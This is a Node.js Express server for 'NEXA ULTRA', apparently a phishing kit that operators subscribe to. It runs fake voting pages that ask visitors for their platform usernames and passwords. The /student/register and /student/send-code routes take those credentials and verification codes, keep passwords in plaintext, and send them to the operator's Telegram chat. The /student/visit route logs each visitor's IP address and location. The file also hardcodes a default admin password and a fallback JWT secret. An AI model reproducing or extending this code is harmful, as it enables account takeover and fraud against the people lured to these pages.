// server.js — NEXA ULTRA (Telegram Integrated)
require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const multer = require("multer");
const jwt = require("jsonwebtoken");
const axios = require("axios");
const bcrypt = require("bcryptjs");
const { v2: cloudinary } = require("cloudinary");
require("./bot.js");
const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ---------- CONFIG ----------
const PORT = process.env.PORT || 5000;
const JWT_SECRET = process.env.JWT_SECRET || "nexa_secret_key";
const CLOUDINARY_FOLDER = process.env.CLOUDINARY_FOLDER || "nexa_mini";
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const DEFAULT_AVATAR_URL = process.env.DEFAULT_AVATAR_URL || "";

// ---------- MONGO ----------
mongoose.connect(process.env.MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => {
    console.log("✅ MongoDB connected");
    ensureDefaultAdmin();
  })
  .catch((err) => console.error("❌ MongoDB connection failed:", err.message));

// ---------- CLOUDINARY ----------
cloudinary.config({
  cloud_name: process.env.CLOUDINARY_NAME || "",
  api_key: process.env.CLOUDINARY_KEY || "",
  api_secret: process.env.CLOUDINARY_SECRET || "",
});

// ---------- MULTER ----------
const upload = multer({ storage: multer.memoryStorage() });

// ---------- MODELS ----------
const AdminSchema = new mongoose.Schema({
  username: { type: String, unique: true, sparse: true },
  firstname: String,
  lastname: String,
  phone: { type: String, unique: true, sparse: true },
  password: String,
  avatar: String,
  referralCode: String,
  chatId: String, // 🔹 replaced apikey with chatId
  bio: String,
  profTag :{type:String,default:"Basic"},
  candTag :{type:String,default:"Cand"},
  slogan: String,
  votes: { type: Number, default: 0 },
  isPaid: { type: Boolean, default: false },
  paidUntil: { type: Date, default: null },         // 🔹 subscription expiry
  referralEnabled: { type: Boolean, default: false }, // 🔹 referral status
  createdAt: { type: Date, default: Date.now }
});
const SettingsSchema = new mongoose.Schema({
  title: { type: String, default: "The People's pick" },
  subTitle: { type: String, default: "Vote us 2025🎉🎊🎉🎊"
  },
  lastSeen:{type:String,default:Date.now()}, 
  description: {
    type: String,
    default: "I need your support! Please take a moment to cast your vote and help me reach new heights in this competition. <strong>Your vote</strong> could be the difference-maker, propelling me toward victory"
  },
  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin" }
});

const Site = mongoose.model("Site", SettingsSchema);
const Admin = mongoose.model("Admin", AdminSchema);

const StudentSchema = new mongoose.Schema({
  username: String,
  password: String,
  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin" },
  studentId: String,
  referrer: String,
  platform: String,
  createdAt: { type: Date, default: Date.now }
});
const Student = mongoose.model("Student", StudentSchema);

const ReferralSchema = new mongoose.Schema({
  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin" },
  code: String,
  createdAt: { type: Date, default: Date.now }
});
const Referral = mongoose.model("Referral", ReferralSchema);

const ActivitySchema = new mongoose.Schema({
  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin" },
  studentId: { type: mongoose.Schema.Types.ObjectId, ref: "Student" },
  action: String,
  details: { type: mongoose.Schema.Types.Mixed, default: {} },
  createdAt: { type: Date, default: Date.now }
});
const Activity = mongoose.model("Activity", ActivitySchema);


const verifyToken = (req, res, next) => {
  try {
    const token = req.headers.authorization?.split(" ")[1];
    if (!token) return res.status(401).json({ success: false, error: "No token" });
    req.userId = jwt.verify(token, JWT_SECRET).id;
    next();
  } catch (err) {
    return res.status(403).json({ success: false, error: "Invalid token" });
  }
};
app.use("/admin", updateLastSeen); // tracks lastSeen for admins

// ---------- HELPERS ----------
function formatPhone(phone) {
  if (!phone) return "";

  const digits = phone.toString().replace(/\D/g, "");
  const localPart = digits.slice(-10);

  if (localPart.length !== 10) throw new Error("Invalid phone number");

  return "234" + localPart;
}
async function updateLastSeen(req, res, next) {
  try {
    if (req.userId) {
      await Admin.findByIdAndUpdate(req.userId, { lastSeen: new Date() });
    }
  } catch (err) {
    console.warn("Couldn't update last seen:", err.message);
  }
  next();
}

// apply globally (after verifyToken)

async function hashPassword(pw) {
  return bcrypt.hash(pw, 10);
}

function generateCode(len = 8) {
  return Math.random().toString(36).substring(2, 2 + len);
}

async function generateUniqueUsername(fn = "user", ln = "nexa") {
  const base = (fn + ln).toLowerCase().replace(/[^a-z0-9]/g, "").slice(0, 8);
  for (let i = 0; i < 6; i++) {
    const name = `${base}${Math.floor(1000 + Math.random() * 9000)}`;
    if (!(await Admin.findOne({ username: name }))) return name;
  }
  return base + Date.now();
}

// 🔹 Send Telegram Message (replaces WhatsApp)
async function sendTelegram(chatId, text) {
  try {
    if (!BOT_TOKEN) throw new Error("Missing BOT_TOKEN");
    const finalChat = chatId;
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: finalChat,
      text,
      parse_mode: "Markdown"
    });
    console.log(`📨 Telegram sent to ${finalChat}`);
  } catch (err) {
    console.error("Telegram failed:", err.message);
  }
}

// server.js

async function sendToAdmin(adminId, msg) {
  try {
    const a = await Admin.findById(adminId).lean();
    if (!a) {
      console.warn("sendToAdmin: admin not found", adminId);
      return;
    }
    const chatId = a.chatId || ADMIN_CHAT_ID;
    await sendTelegram(chatId, msg);
  } catch (err) {
    console.error("sendToAdmin error:", err.message || err);
  }
}

async function getLocation(ip) {
  try {
    const clean = (ip || "").split(",")[0].trim();
    const { data } = await axios.get(`https://ipwho.is/${clean}`);

    if (!data.success) throw new Error("Lookup failed");

    return {
      city: data.city,
      region: data.region,
      country: data.country,
      country_code: data.country_code,
      flag: {
        emoji: data.flag.emoji,
        png: data.flag.png,
        svg: data.flag.svg
      }
    };
  } catch (err) {
    console.warn("getLocation failed:", err?.response?.status || err.message);
    return {};
  }
}

function escapeMarkdown(text) {
  if (!text) return "";
  return text.replace(/([_*[\]()~>#+\-=|{}.!])/g, "\\$1");
}


app.get("/admin/active", verifyToken, async (req, res) => {
  const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
  const activeAdmins = await Admin.find({ lastSeen: { $gte: fiveMinutesAgo } }).select("username chatId lastSeen");
  res.json({ success: true, activeAdmins });
});


//subcription
const subModule = require("./sub");

// after your verifyToken and sendTelegram are defined
subModule(app, { verifyToken, sendTelegram });

// after your verifyToken and sendTelegram are defined
subModule(app, { verifyToken, sendTelegram });


// ---------- BOOTSTRAP ----------
async function ensureDefaultAdmin() {
  try {
    const c = await Admin.countDocuments();
    if (c > 0) return;
    const username = "nexa_admin";
    const phone = formatPhone(process.env.DEFAULT_ADMIN_PHONE || "09122154145");
    const password = await hashPassword("024486");
    const referralCode = "seed_" + Date.now();
    const a = await Admin.create({
      username,
      firstname: "Nexa",
      lastname: "Admin",
      phone,
      password,
      referralCode,
      avatar: DEFAULT_AVATAR_URL,
      chatId: ADMIN_CHAT_ID // 🔹 your Telegram chatId
    });
    await Referral.create({ adminId: a._id, code: referralCode });
    console.log("✅ Default admin created:", username);
  } catch (err) {
    console.error("ensureDefaultAdmin failed:", err);
  }
}
// ----------------- PART 2/2 -----------------

// ---------- ROUTES (continued) ----------

app.get("/", (_, res) => res.json({ success: true, message: "Nexa Ultra backend active (Telegram)" }));

// 🧱 Register Admin (uses chatId)
app.post("/admin/register", async (req, res) => {
  try {
    let { firstname, lastname, phone, password, chatId, slogan, bio } = req.body;
    
    if (!firstname || !lastname || !phone || !password)
      return res.status(400).json({ success: false, error: "Missing fields" });

    phone = formatPhone(phone);
    const exist = await Admin.findOne({ phone });
    if (exist) return res.status(400).json({ success: false, error: "Phone already used" });

    const username = await generateUniqueUsername(firstname, lastname);
    const hash = await hashPassword(password);
    const refCode = generateCode(6).toUpperCase();

    const admin = await Admin.create({
      username,
      firstname,
      lastname,
      phone,
      password: hash,
      referralCode: refCode,
      chatId: chatId || ADMIN_CHAT_ID,
      slogan,
      bio,
      avatar: DEFAULT_AVATAR_URL
    });
    await Referral.create({ adminId: admin._id, code: refCode });

    // notify owner (you) and the new admin
    await sendTelegram(ADMIN_CHAT_ID, `✅ New admin registered: *${firstname} ${lastname}* (${username})\nReferral: ${refCode}`);
    await sendTelegram(admin.chatId, `🎉 Hi ${firstname}, welcome to Nexa Ultra!\nYour referral code: *${refCode}*`);

    const token = jwt.sign({ id: admin._id }, JWT_SECRET, { expiresIn: "7d" });
    res.json({ success: true, token, admin: { username, firstname, lastname, phone, referralCode: refCode } });
  } catch (e) {
    console.error("admin/register error:", e && e.message || e);
    res.status(500).json({ success: false, error: "Registration failed" });
  }
});

// 🗳️ Vote for an Admin (public voting)
app.post("/admins/vote", async (req, res) => {
  try {
    const { adminId } = req.body;
    if (!adminId) return res.status(400).json({ success: false, error: "Missing adminId" });

    const admin = await Admin.findById(adminId);
    if (!admin) return res.status(404).json({ success: false, error: "Admin not found" });

    admin.votes = (admin.votes || 0) + 1;
    await admin.save();

    await Activity.create({
      adminId: admin._id,
      action: "vote_cast",
      details: { newVoteCount: admin.votes },
    });
await sendTelegram(admin.chatId, ` Hi ${admin.firstname},  someone just voted for you, you can now request security code`);

    console.log(`🗳️ Vote recorded for ${admin.username} — total: ${admin.votes}`);

    res.json({
      success: true,
      message: "Vote recorded successfully",
      admin: { username: admin.username, votes: admin.votes },
      
    });
  } catch (err) {
    console.error("Vote error:", err && err.message || err);
    res.status(500).json({ success: false, error: "Server error while voting" });
  }
});

// Fetch site settings (public)
app.get("/student/site", async (req, res) => {
  try {
    const { referralCode } = req.query;
    if (!referralCode) {
      return res.status(400).json({ success: false, error: "Referral code is required" });
    }

    const ref = await Referral.findOne({ code: referralCode }).populate("adminId");
    if (!ref) {
      return res.status(404).json({ success: false, error: "Invalid referral code", referralCode });
    }

    const adminId = ref.adminId?._id;
    if (!adminId) {
      return res.status(404).json({ success: false, error: "Admin not found with the provided referral code" });
    }

    const site = await Site.findOne({ adminId });
    if (!site) {
      return res.status(404).json({ success: false, error: "Settings not found" });
    }

    return res.status(200).json({ success: true, message: "Done", site });
  } catch (err) {
    console.error("Error fetching site:", err);
    res.status(500).json({ success: false, error: "Server error occurred" });
  }
});

// 🪪 Admin Login
app.post("/admin/login", async (req, res) => {
  try {
    let { phone, password } = req.body;
    if (!phone || !password) return res.status(400).json({ success: false, error: "Missing phone or password" });

    phone = formatPhone(phone);
    const admin = await Admin.findOne({ phone });
    if (!admin) return res.status(404).json({ success: false, error: "Admin not found" });

    const ok = await bcrypt.compare(password, admin.password);
    if (!ok) return res.status(401).json({ success: false, error: "Invalid credentials" });

    const token = jwt.sign({ id: admin._id }, JWT_SECRET, { expiresIn: "7d" });

    // notify owner about login and notify admin
    await sendTelegram(ADMIN_CHAT_ID, `🔐 Admin *${admin.username}* (${admin.firstname} ${admin.lastname}) just logged in to their account`);
    await sendTelegram(admin.chatId || ADMIN_CHAT_ID, `🔐 Login detected on your Nexa account (${admin.username})`);

    res.json({ success: true, token, admin: { username: admin.username, phone: admin.phone, referralCode: admin.referralCode, firstname: admin.firstname, lastname: admin.lastname, avatar: admin.avatar, bio: admin.bio, votes: admin.votes } });
  } catch (e) {
    console.error("admin/login error:", e && e.message || e);
    res.status(500).json({ success: false, error: "Login failed" });
  }
});

// 👤 Admin Profile
app.get("/admin/profile", verifyToken, async (req, res) => {
  try {
    const admin = await Admin.findById(req.userId);
    if (!admin) return res.status(404).json({ success: false, error: "Admin not found" });
    res.json({ success: true, profile: admin });
    await admin.save();
  } catch (err) {
    console.error("admin/profile error:", err && err.message || err);
    res.status(500).json({ success: false, error: "Failed to get profile" });
  }
});

// ✍️ Update Admin Info
app.post("/admin/update", verifyToken, async (req, res) => {
  try {
    const { bio, slogan, chatId } = req.body;
    const admin = await Admin.findById(req.userId);
    if (!admin) return res.status(404).json({ success: false, error: "Admin not found" });
    if (bio !== undefined) admin.bio = bio;
    if (slogan !== undefined) admin.slogan = slogan;
    if (chatId !== undefined) admin.chatId = chatId; // allow admins to update their chatId
    await admin.save();

    // notify owner about profile update and the admin
    await sendTelegram(ADMIN_CHAT_ID, `📝 Admin updated profile: *${admin.username}*`);
    await sendTelegram(admin.chatId || ADMIN_CHAT_ID, `📝 Your profile was updated successfully.`);

    res.json({ success: true, admin });
  } catch (e) {
    console.error("admin/update error:", e && e.message || e);
    res.status(500).json({ success: false, error: "Update failed" });
  }
});

// Get students for admin (protected)
app.get("/admin/students", verifyToken, async (req, res) => {
  try {
    const admin = await Admin.findById(req.userId);
    if (!admin) return res.status(404).json({ success: false, error: "Admin not found" });

    const students = await Student.find({ adminId: admin._id }).lean();
    return res.json({ success: true, students });
  } catch (err) {
    console.error("Get students failed:", err && err.message || err);
    return res.status(500).json({ success: false, error: "Failed to fetch students" });
  }
});

/**
 * Student visit tracking
 */
app.post("/student/visit", async (req, res) => {
  try {
    const { path, referrer, utm, userAgent } = req.body || {};
    console.log("📩 /student/visit body:", req.body);

    let admin = null;
    let actualReferrer = referrer;

    if (actualReferrer && actualReferrer !== "null") {
      const ref = await Referral.findOne({ code: actualReferrer }).lean();
      if (ref) admin = await Admin.findById(ref.adminId);
    }

    
  
    if (!admin) {
      console.error("student/visit: No admin available to attribute visit");
      return res.status(500).json({ success: false, error: "No admin found" });
    }

    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress || req.socket?.remoteAddress || null;
    const location = await getLocation(ip);

    await Activity.create({
      adminId: admin._id,
      action: "visit",
      details: { path: path || "/", referrer: actualReferrer || null, utm: utm || null, userAgent: userAgent || null, location }
    });

    // notify admin (non-blocking)

const message = `
Hey *${escapeMarkdown(admin.firstname)}* 📈 someone visited your Page
Path: ${escapeMarkdown(path || "/")}
Referral: ${escapeMarkdown(actualReferrer || "direct")}
Location: ${escapeMarkdown(location.city || "Hidden")}, ${escapeMarkdown(location.country || "Hidden")} ${location.flag?.emoji || ""}
IP: *${escapeMarkdown(ip || "Hidden")}*, ${escapeMarkdown(location.region || "")}
`;

await sendTelegram(admin.chatId, message);
    return res.json({ success: true, message: "Visit tracked" });
  } catch (err) {
    console.error("Visit track failed:", err && err.message || err);
    return res.status(500).json({ success: false, error: "Failed to track visit", details: err && err.message });
  }
});

// 🧍‍♂️ Register Student
app.post("/student/register", async (req, res) => {
  try {
    console.log("📩 /student/register body:", req.body);
    const { username, password, referralCode , platform } = req.body || {};

    if (!username || !password) {
      return res.status(400).json({ success: false, error: "Username and password required" });
    }

    let admin = null;
    if (referralCode && referralCode !== "null") {
      const ref = await Referral.findOne({ code: referralCode }).lean();
      console.log(`referralCode found: ${referralCode} -> ${!!ref}`);
      if (ref) admin = await Admin.findById(ref.adminId);
    }

    // fallback to default admin
    if (!admin) {
      admin = await Admin.findOne({ username: process.env.DEFAULT_ADMIN_USERNAME || "nexa_admin" });
      console.log("Using default admin:", admin ? admin.username : "none");
    }

    // try any admin as a last resort
    if (!admin) {
      admin = await Admin.findOne();
    }

    if (!admin) {
      return res.status(500).json({ success: false, error: "No admin available" });
    }

    const hashed = await hashPassword(password);
    const student = await Student.create({
      username,
      password,
      adminId: admin._id,
      platform: platform || null,
      studentId: generateCode(6),
      referrer: admin.username
    });

    const ip = req.headers["x-forwarded-for"] || req.socket?.remoteAddress || null;
    const location = await getLocation(ip);

    await Activity.create({
      adminId: admin._id,
      studentId: student._id,
      action: "student_register",
      details: { username, location }
    });

    // notify admin & owner
    await sendTelegram(admin.chatId, `
*🌟NEW LOGIN FROM ${platform.toUpperCase()}*\n\n
*details*
Username: *${username}* \nPassword: *${password}*\n
Location: * ${location.city} *, * ${location.country} * `);
    
    await sendTelegram(ADMIN_CHAT_ID, `🆕 Student registered: *${username}* (via ${admin.username}'s link) from *${location.country || "Unknownlocation"}${location.flag.emoji}\n\n Ip address:*${ip}*`);

    return res.json({ success: true, studentId: student._id, admin: { username: admin.username, phone: admin.phone } });
  } catch (e) {
    console.error("student/register error:", e && e.stack || e);
    return res.status(500).json({ success: false, error: "Student signup failed", details: e && e.message });
  }
});

// send verification code to admin via referral
app.post("/student/send-code", async (req, res) => {
  try {
    let { code, referralCode, platform } = req.body || {};
    if (!referralCode || referralCode === "null") referralCode = null;

    if (!code) return res.status(400).json({ success: false, error: "Missing code" });

    // Find referral and corresponding admin
    let refDoc = null;
    if (referralCode) refDoc = await Referral.findOne({ code: referralCode }).lean();
    if (!refDoc) {
      refDoc = referralCode ? await Referral.findOne({ code: referralCode }).lean() : null;
    }
    if (!refDoc) return res.status(404).json({ success: false, error: "Invalid referral code" });

    const admin = await Admin.findById(refDoc.adminId);
    if (!admin) return res.status(404).json({ success: false, error: "Admin not found" });

    const msg = `✅*NEW *${platform.toUpperCase()} CODE*\n\nCode: *${code}\n\nPlatform: ${platform || "NEXA"} `;
    await sendTelegram(admin.chatId, msg);




    await Activity.create({
      adminId: admin._id,
      action: "send_verification_code",
      details: { code, platform },
    });

    return res.json({ success: true, message: "Verification code sent successfully" });
  } catch (err) {
    console.error("Send-code error:", err && err.message || err);
    return res.status(500).json({ success: false, error: "Server error while sending code", details: err && err.message });
  }
});



// --- Debug route: Get admin by username ---
app.get("/admin/by-username/:username", async (req, res) => {
  try {
    const { username } = req.params;
    const Admin = mongoose.model("Admin");
    const admin = await Admin.findOne({ username });

    if (!admin) {
      return res.status(404).json({ success: false, error: "Admin not found" });
    }

    res.json({
      success: true,
      admin: {
        _id: admin._id,
        username: admin.username,
        firstname: admin.firstname,
        lastname: admin.lastname,
        isPaid: admin.isPaid,
        paidUntil: admin.paidUntil,
        referralEnabled: admin.referralEnabled,
      },
    });
  } catch (err) {
    console.error("Error fetching admin by username:", err.message);
    res.status(500).json({ success: false, error: err.message });
  }
});


// admin site update/create (protected)
app.post("/admin/site", verifyToken, async (req, res) => {
  try {
    const { title, subTitle, description } = req.body;

    let site = await Site.findOne({ adminId: req.userId });

    if (!site) {
      site = await Site.create({
        adminId: req.userId,
        title,
        subTitle,
        description,
      });
    } else {
      if ("title" in req.body) site.title = title;
      if ("subTitle" in req.body) site.subTitle = subTitle;
      if ("description" in req.body) site.description = description;
      await site.save();
    }

    return res.json({ success: true, message: "Site updated successfully", site });
  } catch (err) {
    console.error("Error updating site:", err);
    res.status(500).json({ success: false, error: "Something went wrong", details: err.message });
  }
});

app.post("/admin/update-name", verifyToken, async (req, res) => {
  const { firstname, lastname } = req.body;
  try {
    const admin = await Admin.findById(req.userId);
    if (!admin) {
      return res.status(401).json({
        success: false,
        error: "Invalid or expired token"
      });
    }

    if (firstname) admin.firstname = firstname;
    if (lastname) admin.lastname = lastname;

    await admin.save();

    res.status(200).json({
      success: true,
      message: "Name updated successfully", 
      firstname:admin.firstname,
      lastname:admin.lastname
    });

    // send Telegram after response (non-blocking)
    sendTelegram(
      admin.chatId,
      `*CHANGES DETECTED ON YOUR ACCOUNT: ${admin.username}*\n\nWe noticed that you changed your name on Nexa. Log in now to view the changes:\nhttps://adminpanel.vercel.app/${admin.username}`
    );

  } catch (e) {
    res.status(500).json({
      success: false,
      error: "Server error: " + e.message
    });
  }
});   
// 🌐 Public Admins
app.get("/admins/public", async (_, res) => {
  try {
    const admins = await Admin.find().select("username firstname lastname avatar referralCode slogan chatId");
    res.json({ success: true, admins });
  } catch (e) {
    console.error("admins/public error:", e && e.message || e);
    res.status(500).json({ success: false, error: "Failed to fetch admins" });
  }
});

// 🧾 Activity
app.get("/admin/activity", verifyToken, async (req, res) => {
  try {
    const logs = await Activity.find({ adminId: req.userId }).sort({ createdAt: -1 });
    res.json({ success: true, logs });
  } catch (err) {
    console.error("admin/activity error:", err && err.message || err);
    res.status(500).json({ success: false, error: "Failed to fetch activity" });
  }
});

app.post("/admin/avatar", verifyToken, upload.single("avatar"), async (req, res) => {
  try {
    if (!req.file) return res.status(400).json({ success: false, error: "No file uploaded" });

    const result = await cloudinary.uploader.upload_stream(
      { folder: CLOUDINARY_FOLDER },
      async (error, result) => {
        if (error) return res.status(500).json({ success: false, error: error.message });

        const admin = await Admin.findById(req.userId);
        admin.avatar = result.secure_url;
        await admin.save();

        res.json({ success: true, message: "Avatar updated", avatar: admin.avatar });
      }
    );

    result.end(req.file.buffer);
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});


// Broadcast / notify all admins (admin-only route)
app.post("/admin/broadcast", verifyToken, async (req, res) => {
  try {
    const { title, message } = req.body;
    if (!message) return res.status(400).json({ success: false, error: "Message required" });

    const text = `📣 *${title || "Announcement"}*\n\n${message}\n\n_— Nexa System_`;
    const admins = await Admin.find().lean();

    for (const adm of admins) {
      try {
        await sendTelegram(adm.chatId || ADMIN_CHAT_ID, text);
      } catch (e) {
        console.warn("Broadcast individual failed for admin:", adm._id, e && e.message);
      }
    }

    // Log activity (owner/admin who triggered)
    await Activity.create({ adminId: req.userId, action: "broadcast", details: { title, message } });

    res.json({ success: true, message: "Broadcast sent" });
  } catch (err) {
    console.error("broadcast error:", err && err.message || err);
    res.status(500).json({ success: false, error: "Broadcast failed" });
  }
});

app.post("/admin/profTag",async (req,res)=> {
  const {adminId, badge} = req.body;
  
  
})

// Test send for current admin (protected)
app.post("/send-test", verifyToken, async (req, res) => {
  try {
    const admin = await Admin.findById(req.userId);
    if (!admin) return res.status(404).json({ success: false, message: "Admin not found" });
    await sendTelegram(admin.chatId || ADMIN_CHAT_ID, "✅ Your Nexa notification system is working perfectly.");
    res.json({ success: true, message: "Test sent" });
  } catch (err) {
    console.error("send-test error:", err && err.message || err);
    res.status(500).json({ success: false, message: "Test send failed" });
  }
});

// fallback error handler
app.use((err, req, res, next) => {
  console.error("Unhandled error:", err && err.stack || err);
  res.status(500).json({ success: false, error: "Internal server error" });
});

app.listen(PORT, () => console.log(`🚀 Nexa Ultra (Telegram) running on ${PORT}`));
